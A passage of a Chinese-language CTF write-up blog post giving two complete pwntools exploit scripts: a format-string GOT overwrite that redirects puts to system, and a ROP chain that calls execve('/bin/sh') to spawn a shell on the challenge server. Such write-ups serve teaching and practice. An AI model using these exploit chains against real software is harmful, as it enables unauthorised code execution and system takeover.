+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">puts_got = elf.got[&#x27;puts&#x27;]<br>payload = b&quot;/bin/sh;&quot; + b&quot;%8$saaaa&quot; + p64(puts_got)<br>s(payload)<br>puts_addr = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))<br>leak(&quot;puts_addr&quot;,puts_addr)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/21.png"></p>
+<p>泄漏出来后就构造payload修改puts的got表，因为在第一个payload里面已经输入过puts的got表地址了，所以在第二次就只需要输入低位或高位的就行了。完整的exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./pwn&#x27;<br>libc_file=&#x27;libc.so.6&#x27;<br>elf=ELF(pwn_file)<br>libc=ELF(libc_file)<br>rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;nc1.ctfplus.cn&#x27;<br>    port=21381<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu64    =   lambda data                 : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br><br>puts_got = elf.got[&#x27;puts&#x27;]<br>payload_1 = b&quot;/bin/sh;&quot; + b&quot;%8$saaaa&quot; + p64(puts_got)<br>s(payload_1)<br>puts_addr = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))<br>leak(&quot;puts_addr&quot;,puts_addr)<br>libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>system = libc_base + libc.sym[&#x27;system&#x27;]<br><br>low = system &amp; 0xffff<br>high = (system &gt;&gt; 16) &amp; 0xff<br><br>payload_2 = (f&#x27;%&#123;high&#125;c%12$hhn&#x27; + f&#x27;%&#123;low-high&#125;c%8$hn&#x27;).encode()<br>payload_2 = payload_2.ljust(0x18,b&#x27;a&#x27;)<br>payload_2 += p64(puts_got + 2)<br><br>sl(payload_2)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>看起来是一道简单的ret2libc题目，但是这道题目libc的system被修改成执行&#x2F;bin&#x2F;ls指令，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[DEBUG] Received 0x36 bytes:<br>    b&quot;ls: cannot access &#x27;exit 0&#x27;: No such file or directory\n&quot;<br>ls: cannot access &#x27;exit 0&#x27;: No such file or directory<br></code></pre></td></tr></table></figure>
+
+<p>因此就换一个思路，反正已经泄漏了libc基址，gadgets也足够，构造execve(“&#x2F;bin&#x2F;sh”,0,0)来获取shell，首先将&#x2F;bin&#x2F;sh输入到bss段上再进行构造获取shell。exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./pwn&#x27;<br>libc_file=&#x27;libc.so.6&#x27;<br>elf=ELF(pwn_file)<br>libc=ELF(libc_file)<br>rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;nc1.ctfplus.cn&#x27;<br>    port=24144<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu64    =   lambda data                 : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>read_plt = elf.plt[&#x27;read&#x27;]<br>vuln = elf.symbols[&#x27;vuln&#x27;]<br>bss = elf.bss()<br><br>pop_rdi = 0x000000000040119e<br>pop_rsi = 0x00000000004011a0<br>pop_rdx = 0x00000000004011a2<br>ret = 0x000000000040101a<br><br>payload = cyclic(0x20 + 8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>sl(payload)<br><br>io.recvuntil(&quot;Done!\n&quot;)<br>puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>leak(&quot;puts_addr&quot;,puts_addr)<br><br>libc_base = puts_addr - 0x80e50<br><br>execve = libc_base + libc.sym[&#x27;execve&#x27;]<br><br>payload = cyclic(0x20 + 8) + p64(ret) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(0x20) + p64(read_plt) + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(execve)<br>sa(&quot;Input your payload: &quot;,payload)<br>sl(b&quot;/bin/sh\x00&quot;)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h3 id="调皮的文件"><a href="#调皮的文件" class="headerlink" title="调皮的文件"></a>调皮的文件</h3><h3 id="笼中鸟"><a href="#笼中鸟" class="headerlink" title="笼中鸟"></a>笼中鸟</h3>
+        </div>
+
+        
+          <aside class="toc-panel" aria-label="文章目录">
+            <div class="toc-panel__head">
+              <h2>目录</h2>
+              <button class="toc-top" type="button">顶部</button>
+            </div>
+            <nav id="toc"></nav>
+          </aside>
+        
+      </div>
+
+      <nav class="article-nav" aria-label="文章导航">
+        
+        
+          <a href="/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+            <span>下一篇</span>
+            <strong>DIR-815栈溢出漏洞复现</strong>
+          </a>
+        
+      </nav>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>26 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p>&copy; haoo · powered by Hexo</p>
+  </div>
+</footer>
+<dialog
+  id="command-console"
+  class="command-console"
+  aria-labelledby="command-title"
+  data-search-url="/search.json"
+  data-home-url="/"
+  data-categories-url="/categories"
+  data-tags-url="/tags"
+  data-about-url="/about"
+  data-links-url="/links"
+>
+  <div class="command-console__bar">
+    <div>
+      <span class="command-console__status" aria-hidden="true"></span>
+      <strong id="command-title">haoo@blog:~</strong>
+    </div>
+    <button class="command-console__close" type="button" data-command-close aria-label="关闭命令行">ESC</button>
+  </div>
+
+  <div id="command-output" class="command-console__output" role="log" aria-live="polite" aria-relevant="additions">
+    <div class="command-message command-message--accent">Startrace interactive shell v1.0</div>
+    <div class="command-message">输入 <code>help</code> 查看命令，按 <kbd>Ctrl K</kbd> 随时打开。</div>
+  </div>
+
+  <form id="command-form" class="command-console__form" autocomplete="off">
+    <label for="command-input"><span aria-hidden="true">visitor@blog:~$</span><span class="visually-hidden">输入命令</span></label>
+    <input id="command-input" name="command" type="text" inputmode="text" autocapitalize="off" spellcheck="false" aria-describedby="command-hint">
+    <span class="command-console__cursor" aria-hidden="true"></span>
+  </form>
+  <p id="command-hint" class="command-console__hint">help · ls · cd · open · search · clear</p>
+</dialog>
+
+<script src="/js/theme.js" defer></script>
+
+</body>
+</html>
